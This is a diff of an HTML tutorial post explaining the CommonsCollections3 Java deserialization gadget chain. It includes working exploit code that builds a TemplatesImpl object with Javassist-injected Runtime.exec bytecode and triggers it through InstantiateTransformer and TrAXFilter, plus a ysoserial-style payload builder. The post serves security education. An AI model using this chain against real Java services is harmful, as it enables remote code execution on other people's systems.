@@ -1,10 +1,12 @@
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>CommonsCollection3 | zdaylabs</title>
-  <style>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>CommonsCollection3 | zdaylabs</title>
+<link rel="stylesheet" href="style.css"/>
+<style>
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
@@ -91,19 +93,7 @@
       margin-bottom: 1rem;
     }
     
-    pre {
-      background-color: #1e2329;
-      border: 1px solid #333;
-      border-radius: 4px;
-      padding: 1rem;
-      overflow-x: auto;
-      margin: 1rem 0;
-    }
     
-    code {
-      color: #36d1dc;
-      font-family: 'Courier New', monospace;
-    }
     
     a {
       color: #36d1dc;
@@ -131,10 +121,9 @@
   </style>
 </head>
 <body>
-  <div id="navigation-placeholder"></div>
-  <script src="navigation.js"></script>
-
-  <main>
+<div id="navigation-placeholder"></div>
+<script src="navigation.js"></script>
+<main>
 <h1>CommonsCollection3</h1>
 
 The commonsCollection3 and CommonsCollection1 is exactly the same except instead of InvokerTransFormer we use instantiateTransformer and uses of TemplatesImpl and TraXFilter.class
@@ -158,105 +147,100 @@ InstantiateTransformer() constructor takes 2 parameters.
 
 <p>
     When we call the transform() on the instantiateTransformer, the transform() takes one argument.
-    Lets say this is input.<br>
+    Lets say this is input.<br/>
     Now lets see how the transForm() looks like in InstantiateTransFormer.
 </p>
-
 <p>
-    <pre>
-        <code>
-            @Override
-            public T transform(final Class<? extends T> input) {
-                try {
-                    if (input == null) {
-                        throw new FunctorException(
-                            "InstantiateTransformer: Input object was not an instanceof Class, it was a null object");
-                    }
-                    final Constructor<? extends T> con = input.getConstructor(iParamTypes);
-                    return con.newInstance(iArgs);
-                } catch (final NoSuchMethodException ex) {
-                    throw new FunctorException("InstantiateTransformer: The constructor must exist and be public ");
-                } catch (final InstantiationException ex) {
-                    throw new FunctorException("InstantiateTransformer: InstantiationException", ex);
-                } catch (final IllegalAccessException ex) {
-                    throw new FunctorException("InstantiateTransformer: Constructor must be public", ex);
-                } catch (final InvocationTargetException ex) {
-                    throw new FunctorException("InstantiateTransformer: Constructor threw an exception", ex);
-                }
+  <div style="background-color: #1e1f22; color: #bcbec4;">
+    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+    <span style="color: #cf8e6d;">@Override</span>
+    <span style="color: #cf8e6d;">public</span> T <span style="color: #56a8f5;">transform</span>(<span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">Class</span> input) {
+        <span style="color: #cf8e6d;">try</span> {
+            <span style="color: #cf8e6d;">if</span> (input == null) {
+                <span style="color: #cf8e6d;">throw new</span> FunctorException(
+                    <span style="color: #6aab73;">"InstantiateTransformer: Input object was not an instanceof Class, it was a null object"</span>);
             }
-        
+            <span style="color: #cf8e6d;">final</span> Constructor con = input.<span style="color: #56a8f5;">getConstructor</span>(iParamTypes);
+            <span style="color: #cf8e6d;">return</span> (T) con.<span style="color: #56a8f5;">newInstance</span>(iArgs);
+        } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">final</span> NoSuchMethodException ex) {
+            <span style="color: #cf8e6d;">throw new</span> FunctorException(<span style="color: #6aab73;">"InstantiateTransformer: The constructor must exist and be public"</span>);
+        } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">final</span> InstantiationException ex) {
+            <span style="color: #cf8e6d;">throw new</span> FunctorException(<span style="color: #6aab73;">"InstantiateTransformer: InstantiationException"</span>, ex);
+        } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">final</span> IllegalAccessException ex) {
+            <span style="color: #cf8e6d;">throw new</span> FunctorException(<span style="color: #6aab73;">"InstantiateTransformer: Constructor must be public"</span>, ex);
+        } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">final</span> InvocationTargetException ex) {
+            <span style="color: #cf8e6d;">throw new</span> FunctorException(<span style="color: #6aab73;">"InstantiateTransformer: Constructor threw an exception"</span>, ex);
         }
-        </code>
+    }
     </pre>
+    </div>
+    
 </p>
 <p>Which can be simplified as below</p>
 <p>
-    <pre>
-        <code>
-            public T transform(final Class<? extends T> input) {
-                final Constructor<? extends T> con = input.getConstructor(iParamTypes);
-                return con.newInstance(iArgs);
-                }
-        </code>
+  <div style="background-color: #1e1f22; color: #bcbec4;">
+    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+    <span style="color: #cf8e6d;">public</span> T <span style="color: #56a8f5;">transform</span>(<span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">Class</span> input) {
+        <span style="color: #cf8e6d;">final</span> Constructor con = input.<span style="color: #56a8f5;">getConstructor</span>(iParamTypes);
+        <span style="color: #cf8e6d;">return</span> con.<span style="color: #56a8f5;">newInstance</span>(iArgs);
+    }
     </pre>
+    </div>
+    
 </p>
-<p>So the argument we pass to the transform() is the input, and as you can see the transForm uses Reflections to find all the <b>Public</b> Constructors that takes an Argument<br>
+<p>So the argument we pass to the transform() is the input, and as you can see the transForm uses Reflections to find all the <b>Public</b> Constructors that takes an Argument<br/>
 of iParamTypes i.e the type we pass during the initilisation and then it creates a new object of it using newInstance()</p>
-
 <p>
     So lets take some example
 </p>
-<p>Lets say we have a class called AnotherClass which looks like below<br>
-<pre>
-    <code>
-import java.lang.reflect.Method;
-public class AnotherClasss{
-    public AnotherClasss(testclass b,String input)
-    {
-
-            b.Hello(input);
+<p>Lets say we have a class called AnotherClass which looks like below<br/>
+  <div style="background-color: #1e1f22; color: #bcbec4;">
+    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+    <span style="color: #cf8e6d;">import</span> java.lang.reflect.Method;
+    <span style="color: #cf8e6d;">public class</span> AnotherClasss {
+        <span style="color: #cf8e6d;">public</span> AnotherClasss(testclass b, <span style="color: #cf8e6d;">String</span> input) {
+            b.<span style="color: #56a8f5;">Hello</span>(input);
+        }
     }
-}
-                
-    </code>
-</pre>
-<br>
+    </pre>
+    </div>
+    
+<br/>
 Lets Say there is another class called testclass which looks like below
-<br>
-<pre>
-    <code>
-        public class testclass
-{
+<br/>
+<div style="background-color: #1e1f22; color: #bcbec4;">
+  <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+  <span style="color: #cf8e6d;">public class</span> testclass {
+  
+      <span style="color: #cf8e6d;">public void</span> <span style="color: #56a8f5;">Hello</span>(<span style="color: #cf8e6d;">String</span> a) {
+          System.out.<span style="color: #56a8f5;">println</span>(a);
+      }
+  }
+  </pre>
+  </div>
+  
+<br/>
 
-public void  Hello(String a)
-{
-    System.out.println(a);
-}
-}
-    </code>
-</pre>
-<br>
-
-Now we want to call the testClass Hello(), but want to use instntiateTransformer.<br>we can do that Through AnotherClass and the code will look like below<br>
-<pre>
-    <code>
-
-import org.apache.commons.collections.functors.*;
-import org.apache.commons.collections.Transformer;
-
-public class instantclass
-{
-    public static void main(String args[])
-    {
-        ConstantTransformer tr=new ConstantTransformer(1);
-        ConstantTransformer tr1=new ConstantTransformer(AnotherClasss.class);
-        InstantiateTransformer tr2=new InstantiateTransformer(new Class[] { testclass.class,String.class},new Object[]{new testclass(),"ITWORKS"});
-        tr2.transform(tr1.transform(tr.transform("test")));
-    }
-}
-    </code>
-</pre></p>
-
+Now we want to call the testClass Hello(), but want to use instntiateTransformer.<br/>we can do that Through AnotherClass and the code will look like below<br/>
+<div style="background-color: #1e1f22; color: #bcbec4;">
+  <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+  <span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.*;
+  <span style="color: #cf8e6d;">import</span> org.apache.commons.collections.Transformer;
+  
+  <span style="color: #cf8e6d;">public class</span> instantclass {
+      <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span> args[]) {
+          testclass t = <span style="color: #cf8e6d;">new</span> testclass();
+          <span style="color: #cf8e6d;">Class</span>[] paramTypes = <span style="color: #cf8e6d;">new Class</span>[] { testclass.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span> };
+          <span style="color: #cf8e6d;">Object</span>[] args = <span style="color: #cf8e6d;">new Object</span>[] { t, <span style="color: #6aab73;">"ITWORKS"</span> };
+          InstantiateTransformer instantiate = <span style="color: #cf8e6d;">new</span> InstantiateTransformer(
+                  paramTypes, args);
+          
+          instantiate.<span style="color: #56a8f5;">transform</span>(AnotherClasss.<span style="color: #cf8e6d;">class</span>);
+      }
+  }
+  </pre>
+  </div>
+  </p>
 <p>
     SO how exactly this works.?
 </p>
@@ -269,42 +253,42 @@ public class instantclass
     And Hello(String a) method simply prints the Input and hence we see the output as ITWORKS
 </p>
 <p>
-    <img src="images/cc/cc3itworks.PNG">
+<img src="images/cc/cc3itworks.PNG"/>
 </p>
 <p>Lets Understand the payload now</p>
 <p>
-    <pre>
-        <code>
-            public Object getObject(final String command) throws Exception {
-                Object templatesImpl = Gadgets.createTemplatesImpl(command);
-        
-                // inert chain for setup
-                final Transformer transformerChain = new ChainedTransformer(
-                    new Transformer[]{ new ConstantTransformer(1) });
-                // real chain for after setup
-                final Transformer[] transformers = new Transformer[] {
-                        new ConstantTransformer(TrAXFilter.class),
-                        new InstantiateTransformer(
-                                new Class[] { Templates.class },
-                                new Object[] { templatesImpl } )};
-        final Map innerMap = new HashMap();
-        
-                final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-        
-                final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
-        
-                final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
-        
-                Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
-        
-                return handler;
-        }
-        </code>
+  <div style="background-color: #1e1f22; color: #bcbec4;">
+    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+    <span style="color: #cf8e6d;">public Object</span> <span style="color: #56a8f5;">getObject</span>(<span style="color: #cf8e6d;">final String</span> command) <span style="color: #cf8e6d;">throws Exception</span> {
+        Object templatesImpl = Gadgets.<span style="color: #56a8f5;">createTemplatesImpl</span>(command);
+    
+        <span style="color: #6aab73;">// inert chain for setup</span>
+        <span style="color: #cf8e6d;">final Transformer</span> transformerChain = <span style="color: #cf8e6d;">new</span> ChainedTransformer(
+            <span style="color: #cf8e6d;">new Transformer</span>[] { <span style="color: #cf8e6d;">new</span> ConstantTransformer(<span style="color: #b3ae60;">1</span>) });
+    
+        <span style="color: #6aab73;">// real chain for after setup</span>
+        <span style="color: #cf8e6d;">final Transformer</span>[] transformers = <span style="color: #cf8e6d;">new Transformer</span>[] {
+            <span style="color: #cf8e6d;">new</span> ConstantTransformer(TrAXFilter.<span style="color: #cf8e6d;">class</span>),
+            <span style="color: #cf8e6d;">new</span> InstantiateTransformer(
+                <span style="color: #cf8e6d;">new Class</span>[] { Templates.<span style="color: #cf8e6d;">class</span> },
+                <span style="color: #cf8e6d;">new Object</span>[] { templatesImpl })
+        };
+    
+        <span style="color: #cf8e6d;">final Map</span> innerMap = <span style="color: #cf8e6d;">new</span> HashMap();
+        <span style="color: #cf8e6d;">final Map</span> lazyMap = LazyMap.<span style="color: #56a8f5;">decorate</span>(innerMap, transformerChain);
+        <span style="color: #cf8e6d;">final Map</span> mapProxy = Gadgets.<span style="color: #56a8f5;">createMemoitizedProxy</span>(lazyMap, Map.<span style="color: #cf8e6d;">class</span>);
+        <span style="color: #cf8e6d;">final InvocationHandler</span> handler = Gadgets.<span style="color: #56a8f5;">createMemoizedInvocationHandler</span>(mapProxy);
+    
+        Reflections.<span style="color: #56a8f5;">setFieldValue</span>(transformerChain, <span style="color: #6aab73;">"iTransformers"</span>, transformers); <span style="color: #6aab73;">// arm with actual transformer chain</span>
+    
+        <span style="color: #cf8e6d;">return</span> handler;
+    }
     </pre>
+    </div>
+    
 </p>
-
 <div>
-    <p>
+<p>
         On the above code we are Using the InstantiateTransFormer with Templates.class and passing the TemplatesImpl 
         We are obtaining the templatesImpl from Gadgets.createTemplatesImpl(Command)
 
@@ -312,128 +296,73 @@ public class instantclass
     </p>
 </div>
 <div>
-    <p>
-        <pre>
-            <code>
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import java.lang.reflect.Field;
-import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-import org.apache.commons.codec.binary.Base64;
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-
-import javax.xml.transform.Templates;
-import javax.xml.transform.Transformer;
-import org.apache.commons.collections.functors.*;
-public class TemplatesImplExploit {
-    public static void main(String[] args) throws Exception {
-        String command="notepad.exe";
-        ClassPool pool = ClassPool.getDefault();
-
-        /*
-         * So inside the pool.get() we can pass any random existing className , we just have to keep in mind that we call
-         * clazz.makeClassInitializer().insertAfter(cmd); and  CtClass superC = pool.get(AbstractTranslet.class.getName());
-            clazz.setSuperclass(superC);
-
-            Reason for calling the above 2 are.
-            1.In TemplatesIMPL Class when we set the _byteCode to a bytecode of ourchoice, our bytecode must be extending the  
-            AbstractTranslet.class or else TemplatesIMPL will not execute it.
-         */
-
-
-        final CtClass clazz = pool.get(TemplatesImplExploit.class.getName()); // 1
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-            command.replace("\\", "\\\\").replace("\"", "\\\"") +
-            "\");";
-        clazz.makeClassInitializer().insertAfter(cmd);
-        CtClass superC = pool.get(AbstractTranslet.class.getName());
-        clazz.setSuperclass(superC);
-        final byte[] classBytes = clazz.toBytecode();
-
-
-
-        byte[] maliciousBytecode =classBytes;
-    
-
-        /*
-         * Till Line 58 we are creating an Object of TemplatesIMPL class and using reflection to set the _bytecode,_name and
-         * _tfactory , as these are necessary fields.
-         * 
-         */
-
-        TemplatesImpl templates = new TemplatesImpl(); // 2
-
-    
-        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
-        bytecodesField.setAccessible(true);
-        bytecodesField.set(templates, new byte[][]{maliciousBytecode});
-
-       
-        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
-        nameField.setAccessible(true);
-        nameField.set(templates, "Exploit");
-        
-        Field tfacname = TemplatesImpl.class.getDeclaredField("_tfactory");
-        tfacname.setAccessible(true);
-        tfacname.set(templates, TransformerFactoryImpl.class.newInstance());
-
-        //templates.newTransformer();
-
-
-        /*
-         * Below we are using the transformer chain.
-         * The reason why we are taking TemplatesIMPL , is becuase it takes a _bytecode and execute it.
-         * 
-         * 
-         * Why we use TrAxFilter.class
-         * If you see the line 65 there is templates.newTransfromer().This is exactly where our _bytecode gets executed.
-         * So while using the InstantiateTransformer, we have to find a subsequent class (Like Runtime.class in InvokerTransformer)
-         * that takes a entry of type Templates.class and calls the newTransformer() method
-         * 
-         * But why so.
-         * 
-         * If you see how exactly the InstantiateTransformer.transfrom() wroks , you will see the below code.
-         * 
-         *  
-         *  public T transform(final Class<? extends T> input) {
-            final Constructor<? extends T> con = input.getConstructor(iParamTypes);
-            return con.newInstance(iArgs);
-            }
-         * 
-         * So in the above code the transfrom() takes a class as input and calls the getConstructor(), which will return
-         * all the public constrcutors present in there , however it's also passing an argument in getConstructor of 
-         * iParamTypes which it gets from  the initilisation, so on the below code it will be Templates.class
-         * 
-         * So what it will do, it will look for the constructor that takes an argument of type Templates.class and where will it 
-         * look?
-         * 
-         * It will look into the TrAXFilter.class for us cause that is what we are passing in.
-         * If we pass any other class , then it should meet the above criteria so that we can use the InstantiateTransformer.
-         * 
-         * 
-         * Once we set the Transfromer we are simply calling the chainedTransfromer but in a simple way
-         */
-         
-        ConstantTransformer tr=new ConstantTransformer(1); // 3
-        ConstantTransformer tr1=new ConstantTransformer(TrAXFilter.class);
-        InstantiateTransformer tr2=new InstantiateTransformer(new Class[] { Templates.class },new Object[] { templates } );
-        tr2.transform(tr1.transform(tr.transform("test")));
-        
-    }
-}
-            </code>
-        </pre>
-    </p>
+<p><div style="background-color: #1e1f22; color: #bcbec4;">
+  <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+  <span style="color: #cf8e6d;">import</span> java.lang.reflect.Field;
+  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+  <span style="color: #cf8e6d;">import</span> org.apache.commons.codec.binary.Base64;
+  <span style="color: #cf8e6d;">import</span> javassist.ClassClassPath;
+  <span style="color: #cf8e6d;">import</span> javassist.ClassPool;
+  <span style="color: #cf8e6d;">import</span> javassist.CtClass;
+  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+  <span style="color: #cf8e6d;">import</span> javax.xml.transform.Templates;
+  <span style="color: #cf8e6d;">import</span> javax.xml.transform.Transformer;
+  <span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.*;
+  
+  <span style="color: #cf8e6d;">public class</span> TemplatesImplExploit {
+      <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) <span style="color: #cf8e6d;">throws Exception</span> {
+          <span style="color: #cf8e6d;">String</span> command = <span style="color: #6aab73;">"notepad.exe"</span>;
+          ClassPool pool = ClassPool.<span style="color: #56a8f5;">getDefault</span>();
+  
+          <span style="color: #6aab73;">/* ... omitted comments ... */</span>
+  
+          <span style="color: #cf8e6d;">final</span> CtClass clazz = pool.<span style="color: #56a8f5;">get</span>(TemplatesImplExploit.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getName</span>());
+          <span style="color: #cf8e6d;">String</span> cmd = <span style="color: #6aab73;">"java.lang.Runtime.getRuntime().exec(\""</span> +
+              command.<span style="color: #56a8f5;">replace</span>(<span style="color: #6aab73;">"\\"</span>, <span style="color: #6aab73;">"\\\\"</span>).<span style="color: #56a8f5;">replace</span>(<span style="color: #6aab73;">"\""</span>, <span style="color: #6aab73;">"\\\""</span>) +
+              <span style="color: #6aab73;">"\");"</span>;
+          clazz.<span style="color: #56a8f5;">makeClassInitializer</span>().<span style="color: #56a8f5;">insertAfter</span>(cmd);
+          CtClass superC = pool.<span style="color: #56a8f5;">get</span>(AbstractTranslet.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getName</span>());
+          clazz.<span style="color: #56a8f5;">setSuperclass</span>(superC);
+          <span style="color: #cf8e6d;">final byte</span>[] classBytes = clazz.<span style="color: #56a8f5;">toBytecode</span>();
+  
+          <span style="color: #cf8e6d;">byte</span>[] maliciousBytecode = classBytes;
+  
+          TemplatesImpl templates = <span style="color: #cf8e6d;">new</span> TemplatesImpl();
+          Field bytecodesField = TemplatesImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_bytecodes"</span>);
+          bytecodesField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
+          bytecodesField.<span style="color: #56a8f5;">set</span>(templates, <span style="color: #cf8e6d;">new byte</span>[][]{maliciousBytecode});
+  
+          Field nameField = TemplatesImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_name"</span>);
+          nameField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
+          nameField.<span style="color: #56a8f5;">set</span>(templates, <span style="color: #6aab73;">"Exploit"</span>);
+  
+          Field tfacname = TemplatesImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_tfactory"</span>);
+          tfacname.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
+          tfacname.<span style="color: #56a8f5;">set</span>(templates, TransformerFactoryImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">newInstance</span>());
+  
+          <span style="color: #6aab73;">// templates.newTransformer();</span>
+  
+          ConstantTransformer tr = <span style="color: #cf8e6d;">new</span> ConstantTransformer(<span style="color: #b3ae60;">1</span>);
+          ConstantTransformer tr1 = <span style="color: #cf8e6d;">new</span> ConstantTransformer(TrAXFilter.<span style="color: #cf8e6d;">class</span>);
+          InstantiateTransformer tr2 = <span style="color: #cf8e6d;">new</span> InstantiateTransformer(
+              <span style="color: #cf8e6d;">new Class</span>[] { Templates.<span style="color: #cf8e6d;">class</span> },
+              <span style="color: #cf8e6d;">new Object</span>[] { templates });
+  
+          tr2.<span style="color: #56a8f5;">transform</span>(tr1.<span style="color: #56a8f5;">transform</span>(tr.<span style="color: #56a8f5;">transform</span>(<span style="color: #6aab73;">"test"</span>)));
+      }
+  }
+  </pre>
+  </div>
+  
+</p>
 </div>
-
 <div>
-    <p>
+<p>
         On the above code there 3 section.
         At [1] we are using the JavaAssist to initialised the command and inserting it during the runtime .
-        <p>So inside the pool.get() we can pass any random existing className , we just have to keep in mind that we call clazz.makeClassInitializer().insertAfter(cmd); and  CtClass superC = pool.get(AbstractTranslet.class.getName()); and clazz.setSuperclass(superC);<br>
+        <p>So inside the pool.get() we can pass any random existing className , we just have to keep in mind that we call clazz.makeClassInitializer().insertAfter(cmd); and  CtClass superC = pool.get(AbstractTranslet.class.getName()); and clazz.setSuperclass(superC);<br/>
    
                Reason for calling the above 2 are.
                1.In TemplatesIMPL Class when we set the _byteCode to a bytecode of ourchoice, our bytecode must be extending the  
@@ -453,73 +382,69 @@ public class TemplatesImplExploit {
         At [3] we are setting of the InstantiateTransFormer to execute the templates which is basically the TemplatesImpl class Object.
         Now there are couple Questions that need to be answered here.
         <ol>
-            <li>Why TemplatesImpl Class</li>
-            <p>The reason why we are taking TemplatesIMPL , is becuase it takes a _bytecode and execute it.</p>
-            <li>Why TraXFilter Class</li>
-            <p>If you see the line 65 there is templates.newTransfromer().This is exactly where our _bytecode gets executed.<br>
+<li>Why TemplatesImpl Class</li>
+<p>The reason why we are taking TemplatesIMPL , is becuase it takes a _bytecode and execute it.</p>
+<li>Why TraXFilter Class</li>
+<p>If you see the line 65 there is templates.newTransfromer().This is exactly where our _bytecode gets executed.<br/>
                  So while using the InstantiateTransformer, we have to find a subsequent class (Like Runtime.class in InvokerTransformer) that takes a entry of type Templates.class and calls the newTransformer() method</p>
-                <i>But why?</i>
-                <p>If you see how exactly the InstantiateTransformer.transfrom() wroks , you will see the below code.<br>
-
-                    <pre>
-                    public T transform(final Class<? extends T> input) {
-                               final Constructor<? extends T> con = input.getConstructor(iParamTypes);
-                               return con.newInstance(iArgs);
-                               }
-                   </pre>
+<i>But why?</i>
+<p>If you see how exactly the InstantiateTransformer.transfrom() wroks , you will see the below code.<br/>
+  <div style="background-color: #1e1f22; color: #bcbec4;">
+    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+                        <span style="color: #cf8e6d;">public</span> T <span style="color: #56a8f5;">transform</span>(<span style="color: #cf8e6d;">final Class</span> input) {
+                                   <span style="color: #cf8e6d;">final Constructor</span> con = input.<span style="color: #56a8f5;">getConstructor</span>(iParamTypes);
+                                   <span style="color: #cf8e6d;">return</span> con.<span style="color: #56a8f5;">newInstance</span>(iArgs);
+                        }
+    </pre>
+    </div>
+    
                    So in the above code the transfrom() takes a class as input and calls the getConstructor(), which will return all the public constrcutors present in there , however it's also passing an argument
-                   <br>in getConstructor of  iParamTypes which it gets from  the initilisation, so on the below code it will be Templates.class<br><br>
+                   <br/>in getConstructor of  iParamTypes which it gets from  the initilisation, so on the below code it will be Templates.class<br/><br/>
                    
                    So what it will do, it will look for the constructor that takes an argument of type Templates.class and where will it 
-                   look?<br>
-                   It will look into the TrAXFilter.class for us cause that is what we are passing in.<br>
-                   If we pass any other class , then it should meet the above criteria so that we can use the InstantiateTransformer.<br>
-                   (Checkout how InstantiateTransformer Works on the post sections )<br><br>
+                   look?<br/>
+                   It will look into the TrAXFilter.class for us cause that is what we are passing in.<br/>
+                   If we pass any other class , then it should meet the above criteria so that we can use the InstantiateTransformer.<br/>
+                   (Checkout how InstantiateTransformer Works on the post sections )<br/><br/>
                    
                    
                    Once we set the Transfromer we are simply calling the chainedTransfromer but in a simple way just like in the CommonsCollection1.</p>
-                 <li>Why are we passing 1 into constant TransFormer</li>
-                 <p>We dont need, we can remove it and the exploit will still work.</p>
-        </ol>
-
-    </p>
+<li>Why are we passing 1 into constant TransFormer</li>
+<p>We dont need, we can remove it and the exploit will still work.</p>
+</ol>
+</p>
 </div>
 <div>
-    <img src="images/cc/cc3calc.PNG">
+<img src="images/cc/cc3calc.PNG"/>
 </div>
 <div>
-    <p>
+<p>
         This is how the CommonsCollection3 Works.
     </p>
-    <p>We simply use the TemplateImpl class so that we can execute our own _byteCode and then then the instntiateTransformer so that we can instntiate the Templates.Class</p>
-    <p>Apart from the above changes everything else remains Same</p>
+<p>We simply use the TemplateImpl class so that we can execute our own _byteCode and then then the instntiateTransformer so that we can instntiate the Templates.Class</p>
+<p>Apart from the above changes everything else remains Same</p>
 </div>
-
-
 <h4>Summary:</h4>
 <ul>
-  <li><code>CommonsCollections3</code> is similar to CC1, but uses <code>InstantiateTransformer</code> instead of <code>InvokerTransformer</code>.</li>
-  <li><code>InstantiateTransformer</code> takes a class and instantiates it using specified constructor arguments.</li>
-  <li>We use <code>TemplatesImpl</code> to embed malicious bytecode, which is executed when <code>newTransformer()</code> is called.</li>
-  <li><code>TrAXFilter.class</code> is chosen because it has a public constructor that takes a <code>Templates</code> object and internally calls <code>newTransformer()</code>.</li>
-  <li>The transformer chain consists of:
+<li><code>CommonsCollections3</code> is similar to CC1, but uses <code>InstantiateTransformer</code> instead of <code>InvokerTransformer</code>.</li>
+<li><code>InstantiateTransformer</code> takes a class and instantiates it using specified constructor arguments.</li>
+<li>We use <code>TemplatesImpl</code> to embed malicious bytecode, which is executed when <code>newTransformer()</code> is called.</li>
+<li><code>TrAXFilter.class</code> is chosen because it has a public constructor that takes a <code>Templates</code> object and internally calls <code>newTransformer()</code>.</li>
+<li>The transformer chain consists of:
     <ul>
-      <li><code>ConstantTransformer(TrAXFilter.class)</code> - always returns the class</li>
-      <li><code>InstantiateTransformer</code> - uses the class and the malicious <code>TemplatesImpl</code> object to instantiate a new <code>TrAXFilter</code>, triggering the exploit</li>
-    </ul>
-  </li>
-  <li><code>TemplatesImpl</code> is created using JavaAssist to inject a malicious static initializer (e.g., <code>Runtime.getRuntime().exec()</code>).</li>
-  <li>Execution occurs when the transform chain is triggered (e.g., via <code>LazyMap.get()</code> or any gadget that invokes the transformer).</li>
+<li><code>ConstantTransformer(TrAXFilter.class)</code> - always returns the class</li>
+<li><code>InstantiateTransformer</code> - uses the class and the malicious <code>TemplatesImpl</code> object to instantiate a new <code>TrAXFilter</code>, triggering the exploit</li>
 </ul>
-
-
+</li>
+<li><code>TemplatesImpl</code> is created using JavaAssist to inject a malicious static initializer (e.g., <code>Runtime.getRuntime().exec()</code>).</li>
+<li>Execution occurs when the transform chain is triggered (e.g., via <code>LazyMap.get()</code> or any gadget that invokes the transformer).</li>
+</ul>
 <p>Thats it for Today.</p>
 <p>Thanks For Reading.</p>
 <p>Happy Hacking.</p>
 <p>You can connect with me at:</p>
 <p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
 <p><a href="https://x.com/webspl01t3r">Twitter</a></p>
-
-  </main>
+</main>
 </body>
 </html>
